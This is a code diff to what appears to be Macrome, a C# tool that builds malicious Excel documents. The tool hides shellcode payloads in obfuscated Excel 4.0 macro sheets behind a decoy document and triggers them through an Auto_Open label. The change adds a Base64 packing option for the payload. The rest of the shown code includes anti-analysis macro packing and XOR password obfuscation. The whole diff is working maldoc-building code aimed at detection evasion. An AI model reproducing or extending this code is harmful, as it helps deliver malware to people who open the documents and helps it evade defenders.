@@ -182,13 +182,15 @@ namespace Macrome
         /// <param name="macroSheetName">The name that should be used for the macro sheet. Defaults to Sheet2</param>
         /// <param name="outputFileName">The output filename used for the generated document. Defaults to output.xls</param>
         /// <param name="debugMode">Set this to true to make the program wait for a debugger to attach. Defaults to false</param>
+        /// <param name="payloadMethod">How should shellcode be written in the document. Defaults to using the SheetPackingMethod for encoding.</param>
         /// <param name="password">Password to encrypt document using XOR Obfuscation.</param>
         /// <param name="method">Which method to use for obfuscating macros. Defaults to ObfuscatedCharFunc. </param>
         /// <param name="localizedLabel">Use this flag in order to set a localized label in case Excel is not in US language. Default to Auto_Open</param>
         public static void Build(FileInfo decoyDocument, FileInfo payload, FileInfo payload64Bit, string preamble,
             PayloadType payloadType = PayloadType.Shellcode, 
             string macroSheetName = "Sheet2", string outputFileName = "output.xls", bool debugMode = false,
-            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc, string password = "", string localizedLabel = "Auto_Open")
+            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc, PayloadPackingMethod payloadMethod = PayloadPackingMethod.MatchSheetPackingMethod, 
+            string password = "", string localizedLabel = "Auto_Open")
         {
             if (decoyDocument == null || payload == null)
             {
@@ -265,7 +267,15 @@ namespace Macrome
 
             if (binaryPayload != null && binaryPayload.Length > 0)
             {
-                 wbe.SetMacroBinaryContent(binaryPayload, curRw, curCol, dstRwStart, dstColStart + 1, method);
+                 if (payloadMethod == PayloadPackingMethod.Base64)
+                 {
+                     wbe.SetMacroBinaryContent(binaryPayload, 0, dstColStart + 1, 0, 0, method, payloadMethod);
+                 }
+                 else
+                 {
+                     wbe.SetMacroBinaryContent(binaryPayload, curRw, curCol, dstRwStart, dstColStart + 1, method);   
+                 }
+                 
                  curRw = wbe.WbStream.GetFirstEmptyRowInColumn(colStart) + 1;
 
                  if (rwStart > 0xE000)
@@ -276,7 +286,15 @@ namespace Macrome
 
                  if (binary64Payload != null && binary64Payload.Length > 0)
                  {
-                     wbe.SetMacroBinaryContent(binary64Payload, curRw, curCol, dstRwStart, dstColStart + 2, method);
+                     if (payloadMethod == PayloadPackingMethod.Base64)
+                     {
+                         wbe.SetMacroBinaryContent(binary64Payload, 0, dstColStart + 2, 0, 0, method, payloadMethod);
+                     }
+                     else
+                     {
+                         wbe.SetMacroBinaryContent(binary64Payload, curRw, curCol, dstRwStart, dstColStart + 2, method);   
+                     }
+
                      curRw = wbe.WbStream.GetFirstEmptyRowInColumn(colStart) + 1;
 
                      if (rwStart > 0xE000)
@@ -284,10 +302,18 @@ namespace Macrome
                          curRw = 0;
                          curCol += 1;
                      }
-
+                     
                      macros = MacroPatterns.GetMultiPlatformBinaryPattern(preambleCode, macroSheetName);
                  }
+
+                 if (payloadMethod == PayloadPackingMethod.Base64)
+                 {
+                     macros = MacroPatterns.GetBase64DecodePattern(preambleCode);
+                 }
             }
+            
+
+            
             wbe.SetMacroSheetContent(macros, curRw,curCol, dstRwStart, dstColStart, method);
 
             if (method == SheetPackingMethod.CharSubroutine || method == SheetPackingMethod.AntiAnalysisCharSubroutine)
@@ -304,7 +330,7 @@ namespace Macrome
                  wbe.AddLabel(UnicodeHelper.UnicodeArgumentLabel, null, true, true);
                  //Using lblIndex 2, since that what var has set for us
                  wbe.AddFormula(
-                     FormulaHelper.CreateCharInvocationFormulaForLblIndex(charInvocationRw, charInvocationCol, 2));
+                     FormulaHelper.CreateCharInvocationFormulaForLblIndex(charInvocationRw, charInvocationCol, 2), payloadMethod);
             }
 
             wbe.AddLabel(localizedLabel, rwStart, colStart);
